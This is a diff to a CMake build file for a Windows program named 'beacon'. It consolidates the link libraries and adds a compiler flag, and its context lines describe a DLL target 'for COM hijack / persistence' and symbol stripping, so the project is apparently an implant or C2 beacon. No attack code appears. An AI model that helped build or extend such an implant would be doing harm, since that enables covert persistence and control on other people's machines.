@@ -17,16 +17,22 @@ set(BEACON_SOURCES
     src/killswich.c
 )
 
+# -- Compiler flags (needed for _rdrand32_step intrinsic) ---------------
+add_compile_options(-mrdrnd)
+
+# -- Link libraries shared by both targets -----------------------------
+set(BEACON_LIBS winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi shlwapi gdi32 netapi32 crypt32)
+
 # -- EXE target --------------------------------------------------------
 add_executable(beacon ${BEACON_SOURCES})
 target_include_directories(beacon PRIVATE include)
-target_link_libraries(beacon winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi)
+target_link_libraries(beacon ${BEACON_LIBS})
 
 # -- DLL target (for COM hijack / persistence) -------------------------
 add_library(beacon_dll SHARED ${BEACON_SOURCES})
 target_include_directories(beacon_dll PRIVATE include)
 target_compile_definitions(beacon_dll PRIVATE BEACON_DLL)
-target_link_libraries(beacon_dll winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi)
+target_link_libraries(beacon_dll ${BEACON_LIBS})
 
 # -- Release flags (strip symbols, no CRT noise) ----------------------
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
